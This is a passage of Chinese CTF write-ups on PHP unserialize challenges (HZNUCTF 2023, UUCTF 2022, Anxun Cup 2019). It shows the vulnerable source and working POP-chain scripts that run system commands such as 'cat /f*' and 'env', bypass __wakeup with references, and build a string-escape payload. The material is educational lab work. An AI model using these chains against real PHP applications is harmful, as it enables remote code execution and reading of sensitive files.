language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们先大概看一遍，然后发现了file_get_contents()这个函数  读取指定路径下文件的内容</p><p>file_get_()——&gt;get——&gt; _get魔术方法 ——&gt;tostring——&gt;上面那个类的echo</p><p>pop链如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$c</span>-&gt;params[<span class="hljs-string">&#x27;source&#x27;</span>]=<span class="hljs-string">&quot;/var/www/html/f1ag.php&quot;</span>;<br><span class="hljs-variable">$b</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$a</span>-&gt;str=<span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="HZNUCTF-2023-preliminary-ppppop已解决"><a href="#HZNUCTF-2023-preliminary-ppppop已解决" class="headerlink" title="[HZNUCTF 2023 preliminary]ppppop已解决"></a>[HZNUCTF 2023 preliminary]ppppop已解决</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;utils.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$className</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcName</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;className;<br>        <span class="hljs-variable">$funcName</span> = <span class="hljs-variable language_">$this</span>-&gt;funcName;<br>        <span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$funcName</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-variable">$func</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">checkUser</span>()) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]));<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$payload</span>);<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>这一题的话跟学校新生赛有一道题很像 我感觉出处就是这里</p><p>就是进行一个cookie身份验证 然后可以得到代码</p><p>这个代码相对来说较为简单</p><p>让className为B 可以触发call魔术方法 然后下面就是进行一个命令执行 读取环境变量 env 就可以得到flag 否则的话的去其他目录下面寻找</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;utils.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$className</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcName</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;className;<br>        <span class="hljs-variable">$funcName</span> = <span class="hljs-variable language_">$this</span>-&gt;funcName;<br>        <span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$funcName</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-variable">$func</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$a</span>-&gt;className=<span class="hljs-string">&#x27;B&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;funcName=<span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;args=<span class="hljs-string">&#x27;env&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="UUCTF-2022-新生赛-ez-unser"><a href="#UUCTF-2022-新生赛-ez-unser" class="headerlink" title="[UUCTF 2022 新生赛]ez_unser"></a>[UUCTF 2022 新生赛]ez_unser</h1><p>下面来看一下利用引用绕过wakeup</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">###very___so___easy!!!!</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-number">1</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-number">2</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;c=<span class="hljs-number">3</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-variable language_">$this</span>-&gt;c;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/test&quot;:3/i&#x27;</span>,<span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你输入的不正确！！！搞什么！！&quot;</span>);<br>&#125;<br><span class="hljs-variable">$bbb</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>你输入的不正确！！！搞什么！！<br></code></pre></td></tr></table></figure><p>这个的话在wakeup这里会将a赋为一个空值 然后这样的话我们的eval($this-&gt;a)就不能被执行</p><p>一般来讲 绕过wakeup就是成员属性的数量比实际的大就可以 </p><p>就拿上面来说：将test实例化成对象然后进行反序列化的时候结果如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">2</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">3</span>;&#125;<br></code></pre></td></tr></table></figure><p>就是将test”:3 改成test”:4 即可 但你看下面的正则匹配 </p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/test&quot;:3/i&#x27;</span>,$a))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你输入的不正确！！！搞什么！！&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个值是不能变化的 那么就不能通过这个进行绕过</p><p>这就要引入了一个知识点 ：引用的概念：简单来讲就是两个变量指向的是同一个地址块 所以两个变量其实也就是一个变量了</p><p>我们可以将a和b进行一个引用 再利用下面的</p><p> $this-&gt;b=$this-&gt;c;    c的值赋给了b 说白了也就是给了a</p><p>这样就可以绕过了wakeup 综上所述  pop如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-number">1</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-number">2</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;c=<span class="hljs-number">3</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-variable language_">$this</span>-&gt;c;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$d</span>-&gt;b=&amp;<span class="hljs-variable">$d</span>-&gt;a;<br><span class="hljs-variable">$d</span>-&gt;c=<span class="hljs-string">&#x27;system(&quot;cat /f*&quot;);&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="UUCTF-2022-新生赛-ezpop"><a href="#UUCTF-2022-新生赛-ezpop" class="headerlink" title="[UUCTF 2022 新生赛]ezpop"></a>[UUCTF 2022 新生赛]ezpop</h1><p>这一题考察的是反序列化利用引用绕过wakeup和利用字符串逃逸构造恶意代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UUCTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>,<span class="hljs-variable">$key</span>,<span class="hljs-variable">$basedata</span>,<span class="hljs-variable">$ob</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$str</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;key===<span class="hljs-string">&quot;UUCTF&quot;</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;ob=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$this</span>-&gt;basedata));<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">output</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">rce</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">nothing</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-variable language_">$this</span>-&gt;t;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">youwant</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rce</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$pdata</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;data&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pdata</span>))<br>&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">UUCTF</span>(<span class="hljs-variable">$pdata</span>));<br>    <span class="hljs-variable">$data_replace</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;hacker&quot;</span>,<span class="hljs-string">&quot;loveuu!&quot;</span>,<span class="hljs-variable">$data</span>);<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data_replace</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这个引用绕过 wakeup 上面那一题跟这个很像 所以就不再过多的简述</p><p>链子如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">output</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">rce</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">nothing</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-variable language_">$this</span>-&gt;t;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">youwant</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rce</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">output</span>();<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">nothing</span>();<br><span class="hljs-variable">$e</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">youwant</span>();<br><span class="hljs-variable">$e</span>-&gt;cmd=<span class="hljs-string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span>;<br><span class="hljs-variable">$c</span>-&gt;a=<span class="hljs-variable">$e</span>;<br><span class="hljs-variable">$d</span>-&gt;b=&amp;<span class="hljs-variable">$d</span>-&gt;a;<br><span class="hljs-variable">$d</span>-&gt;t=<span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$d</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后为什么要进行一个base64编码呢 因为上面的</p><p> $this-&gt;ob=unserialize(base64_decode($this-&gt;basedata));</p><p>先来说一下后面的实现过程 </p><p>下面post传入一个值 然后给了pdata 这个pdata也就相当于上面的 $this-&gt;name=$str;</p><p>然后进行一个替换匹配到了hacker给替换成loveuu！这个联想到了字符串逃逸增加</p><p>最后进行一个反序列化 这里触发了上面的wakeup</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;key===<span class="hljs-string">&quot;UUCTF&quot;</span>)&#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;ob=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$this</span>-&gt;basedata));<br>       &#125;<br>       <span class="hljs-keyword">else</span>&#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>对basedata的值进行一个base64解码并且反序列化</p><p>最下面的对传入的post的值进行一个序列化 这里的key和basedata都是空值 因为它接收的是上面的name的值 所以这里为了下一步wakeup里面的进行 进行了一个字符串逃逸</p><p>“;s:3:”key”;s:5:”UUCTF”;s:8:”basedata”;s:176:”Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjIzOiJzeXN0ZW0oImNhdCBmbGFnLnBocCIpOyI7fX19”;s:2:”ob”;N;}   236个字符  需要236个hacker</p><h1 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h1><p>这一题的话考察了对字符串逃逸的理解以及变量覆盖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 